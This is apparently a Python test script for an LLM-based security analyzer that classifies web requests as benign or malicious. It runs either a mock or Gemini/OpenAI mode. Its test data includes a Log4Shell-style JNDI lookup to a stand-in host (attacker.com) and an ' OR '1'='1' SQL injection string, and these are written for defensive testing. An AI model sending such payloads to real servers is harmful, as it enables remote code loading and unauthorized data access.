# test_tier2_ai_engine.py - Test Phase 2 Tier 2 (AI Engine)
"""
Tests for ai_engine.py - LLM-based semantic analysis
Run: python test_tier2_ai_engine.py

Note: Requires GOOGLE_API_KEY environment variable for real API tests (Gemini)
       Or OPENAI_API_KEY for OpenAI tests
"""

import json
import os
import sys
import asyncio

sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))

from phase2.ai_engine import AISecurityAnalyzer


class MockAIAnalyzer:
    """Mock AI analyzer for testing without API key"""
    
    @staticmethod
    async def analyze(request_data):
        """Mock analysis without making API calls"""
        body = request_data.get('request_body_preview', '').lower()
        
        # Simple heuristics for mocking
        if 'jndi' in body or 'ldap' in body:
            return {
                'severity': 9,
                'threat_type': 'LDAP_Injection',
                'confidence': 0.95,
                'is_zerodday': True,
                'attack_vectors': ['JNDI_Injection'],
                'reasoning': '[MOCK] LDAP injection detected',
                'recommended_action': 'block'
            }
        elif 'or' in body and '1' in body:
            return {
                'severity': 8,
                'threat_type': 'SQL_Injection',
                'confidence': 0.90,
                'is_zerodday': False,
                'attack_vectors': ['Boolean_Logic'],
                'reasoning': '[MOCK] SQL injection pattern detected',
                'recommended_action': 'block'
            }
        else:
            return {
                'severity': 2,
                'threat_type': 'BENIGN',
                'confidence': 0.85,
                'is_zerodday': False,
                'attack_vectors': [],
                'reasoning': '[MOCK] Request appears benign',
                'recommended_action': 'allow'
            }


def print_analysis_result(test_name, request_data, result):
    """Pretty print analysis result"""
    severity = result.get('severity', 0)
    threat_type = result.get('threat_type', 'UNKNOWN')
    confidence = result.get('confidence', 0)
    is_zerodday = result.get('is_zerodday', False)
    
    # Emoji based on severity
    if severity >= 8:
        emoji = "🚨"
    elif severity >= 5:
        emoji = "⚠️"
    else:
        emoji = "✅"
    
    print(f"\n{'='*70}")
    print(f"Test: {test_name}")
    print(f"{'='*70}")
    print(f"{emoji} Severity:         {severity}/10")
    print(f"Threat Type:        {threat_type}")
    print(f"Confidence:         {confidence:.2%}")
    print(f"Zero-Day:           {'Yes' if is_zerodday else 'No'}")
    print(f"Request Path:       {request_data.get('path', 'N/A')}")
    print(f"Attack Vectors:     {', '.join(result.get('attack_vectors', ['None']))}")
    print(f"Recommended Action: {result.get('recommended_action', 'N/A')}")
    print(f"Reasoning:          {result.get('reasoning', 'N/A')}")


async def run_tests_async(use_mock=True):
    """Run all test cases (async)"""
    print("\n" + "="*70)
    print(f"PHASE 2 - TIER 2 (AI ENGINE) TESTING {'[MOCK MODE]' if use_mock else '[REAL API]'}")
    print("="*70)
    
    # Test cases
    test_cases = [
        ("Normal Request", {
            'method': 'GET',
            'path': 'api/data',
            'request_body_preview': '{"id": 123, "name": "test"}',
            'headers': {'user-agent': 'Mozilla/5.0'},
            'client_ip': '127.0.0.1',
            'response_status': 200,
            'response_time_ms': 45
        }),
        ("LDAP Injection (Log4Shell-like)", {
            'method': 'POST',
            'path': 'api/process',
            'request_body_preview': '{"data": "${jndi:ldap://attacker.com/a}"}',
            'headers': {'user-agent': 'Mozilla/5.0'},
            'client_ip': '203.0.113.45',
            'response_status': 200,
            'response_time_ms': 32
        }),
        ("SQL Injection (OR Logic)", {
            'method': 'POST',
            'path': 'api/users',
            'request_body_preview': "{'id': ' OR '1'='1'}",
            'headers': {'user-agent': 'Mozilla/5.0'},
            'client_ip': '203.0.113.50',
            'response_status': 200,
            'response_time_ms': 50
        }),
        ("Ambiguous Payload", {
            'method': 'POST',
            'path': 'api/execute',
            'request_body_preview': '{"cmd": "process ${var} with [special] chars"}',
            'headers': {'user-agent': 'Mozilla/5.0'},
            'client_ip': '203.0.113.75',
            'response_status': 200,
            'response_time_ms': 125
        }),
    ]
    
    # Choose analyzer
    if use_mock:
        analyzer = MockAIAnalyzer()
    else:
        try:
            # Try to use Google Gemini API key first, then fall back to OpenAI
            api_key = os.getenv('GOOGLE_API_KEY') or os.getenv('OPENAI_API_KEY')
            analyzer = AISecurityAnalyzer(api_key=api_key)
            api_provider = "Google Gemini" if os.getenv('GOOGLE_API_KEY') else "OpenAI"
            print(f"✅ {api_provider} API initialized")
        except ValueError as e:
            print(f"❌ {e}")
            print("Falling back to MOCK mode...")
            use_mock = True
            analyzer = MockAIAnalyzer()
    
    results = []
    
    for test_name, request_data in test_cases:
        try:
            print(f"\n⏳ Analyzing: {test_name}...", end='', flush=True)
            
            result = await analyzer.analyze(request_data)
            
            print(" Done")
            print_analysis_result(test_name, request_data, result)
            
            results.append({
                'test': test_name,
                'severity': result.get('severity', 0),
                'threat_type': result.get('threat_type', 'UNKNOWN'),
                'success': True
            })
        
        except Exception as e:
            print(f" Error")
            print(f"❌ Error analyzing: {e}")
            results.append({
                'test': test_name,
                'error': str(e),
                'success': False
            })
    
    # Summary
    print("\n" + "="*70)
    print("SUMMARY")
    print("="*70)
    
    successful = sum(1 for r in results if r.get('success', False))
    print(f"Total Tests:     {len(test_cases)}")
    print(f"Successful:      {successful} ✅")
    print(f"Failed:          {len(test_cases) - successful} ❌")
    
    if successful == len(test_cases):
        print(f"\n🎉 ALL TIER 2 TESTS {'PASSED' if not use_mock else 'PASSED (MOCK MODE)'}!")
    else:
        print(f"\n⚠️  {len(test_cases) - successful} tests failed.")
    
    # Close real analyzer
    if not use_mock and hasattr(analyzer, 'close'):
        await analyzer.close()
    
    return successful == len(test_cases)


def main():
    """Main entry point"""
    # Check if real API key is available (Google Gemini or OpenAI)
    gemini_api_key = os.getenv('GOOGLE_API_KEY')
    openai_api_key = os.getenv('OPENAI_API_KEY')
    use_mock = not gemini_api_key and not openai_api_key
    
    if use_mock:
        print("\n⚠️  No API keys found (GOOGLE_API_KEY or OPENAI_API_KEY). Using MOCK mode.")
        print("To test with real API:")
        print("  - Set GOOGLE_API_KEY for Google Gemini")
        print("  - Or set OPENAI_API_KEY for OpenAI")
    else:
        if gemini_api_key:
            print(f"\n✅ GOOGLE_API_KEY found. Using REAL API mode (Google Gemini).")
        else:
            print(f"\n✅ OPENAI_API_KEY found. Using REAL API mode (OpenAI).")
    
    # Run tests
    success = asyncio.run(run_tests_async(use_mock=use_mock))
    
    return success


if __name__ == '__main__':
    success = main()
    sys.exit(0 if success else 1)
